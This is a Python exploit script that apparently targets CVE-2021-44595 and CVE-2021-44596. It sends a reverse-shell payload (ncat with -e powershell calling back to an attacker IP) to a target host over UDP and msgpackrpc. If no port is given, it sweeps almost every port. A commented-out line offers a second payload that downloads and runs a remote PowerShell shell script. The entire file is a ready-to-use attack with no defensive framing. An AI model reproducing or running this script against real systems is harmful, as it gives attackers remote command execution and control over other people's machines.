#!/usr/bin/python3

import socket

try:
    import msgpackrpc
    enable44595 = True
except Exception as ex:
    print("Might need to install msgpackrpc, as it is a part of 2021-44595")
    print("Non-critical Error: ", ex)
    enable44595 = False
    

reverse_shell_ip = "10.1.1.21"
reverse_shell_port = 1038
target_ip = "10.1.1.10"
target_port = 5040 # optional, if not sure just set to -1

ncat_dir = "C:\\Temp\\nc64.exe"
payload = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
#payload = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"

logo = """
┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏┓┏┓┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏━     
┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┣┓┣╋┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┗┓ ┏┓┓┏
┗━┗┛┗━┻  ┗╋┗╋┗┛┗┛┗┛┗┻┗━┗┛┗━┻  ┗╋┗╋┗┛┗┛┗┛•┣┛┗┫
                                         ┛  ┛
# Source: 
https://github.com/i-vt

# OGs: 
https://www.exploit-db.com/exploits/50912
https://www.exploit-db.com/exploits/50913
"""
if target_port not in ["-1", -1]: 
    ports_to_scan = [target_port]
else: 
    ports_to_scan = list(range(0,65500))
    if reverse_shell_ip == target_ip or reverse_shell_ip in ["127.0.0.1", "::1"]:
        ports_to_scan.remove(reverse_shell_port)

def send_payload_44596(port):
    byte_message = bytes(payload, "utf-8")
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opened_socket.sendto(byte_message, (target_ip, port))
def send_payload_44595(port):
    client = msgpackrpc.Client(msgpackrpc.Address(target_ip, port))
    result = client.call('system_s','powershell',payload)


sent_packets = []
for port in ports_to_scan:
    if enable44595: 
        try:
            send_payload_44595(port)
            print("[2021-44595] Payload successfully sent to port:", port)
        except:
            print("[2021-44595] Payload failed to send to port:", port)
    try:
        send_payload_44596(port)
        print("[2021-44596] Payload successfully sent to port:", port)
    except:
        print("[2021-44596] Payload failed to send to port:", port)
        
            
    
        